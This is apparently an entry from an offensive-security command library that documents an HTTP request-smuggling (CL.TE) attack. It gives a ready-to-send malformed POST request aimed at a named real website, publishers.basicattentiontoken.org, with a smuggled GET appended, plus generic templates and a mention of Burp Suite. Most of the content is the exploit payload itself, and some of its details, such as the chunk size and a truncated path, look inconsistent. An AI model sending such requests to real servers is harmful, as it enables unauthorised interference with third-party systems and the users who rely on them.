---
data: >+
  POST /publishers/registrations.json HTTP/1.1

  Host: publishers.basicattentiontoken.org

  Content-Length: 136

  Transfer-Encoding: chunked


  1635

  {"publisher":{"email":"test@example.com","name":"Test
  Publisher","show_verification_status":true,"uphold_verified":false}}

  00

  GET /assets/muli/Muli-Bold-...woff2 HTTP/1.1

  Host: publishers.basicattentiontoken.org

tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Web
id: 228bc866-dd15-4e6a-abad-4fedfe3a58c3
created_at: '2025-12-13T09:01:17.581Z'
updated_at: '2025-12-13T09:01:17.581Z'
verified: false
validated: true
submitted: true
---
# Craft Smuggled POST Request

## Command

```http
POST /publishers/registrations.json HTTP/1.1
Host: publishers.basicattentiontoken.org
Content-Length: 136
Transfer-Encoding: chunked

1635
{"publisher":{"email":"test@example.com","name":"Test Publisher","show_verification_status":true,"uphold_verified":false}}
00
GET /assets/muli/Muli-Bold-...woff2 HTTP/1.1
Host: publishers.basicattentiontoken.org

```

## Description

Crafts a malformed POST request exploiting CL.TE smuggling by appending a smuggled GET request after the chunked payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Content-Length` | Sets length to mismatch with chunks | Yes |
| `Transfer-Encoding` | Enables chunked encoding for smuggling | Yes |

## Examples

### Basic Usage

```http
POST /endpoint HTTP/1.1
Host: target
Content-Length: 100
Transfer-Encoding: chunked

chunk
payload
00
SMUGGLED REQUEST
```

### Advanced Usage

```http
POST /endpoint HTTP/1.1
Host: target
Content-Length: 136
Transfer-Encoding: chunked

1635
json_payload
00
GET /file HTTP/1.1
Host: target
```

## Expected Output

A complete HTTP request ready for sending via tools like Burp Suite.

## Related

- [[commands/run-turbo-intruder-script]]
- [[procedures/Exploit-HTTP-Request-Smuggling-CL-TE]]
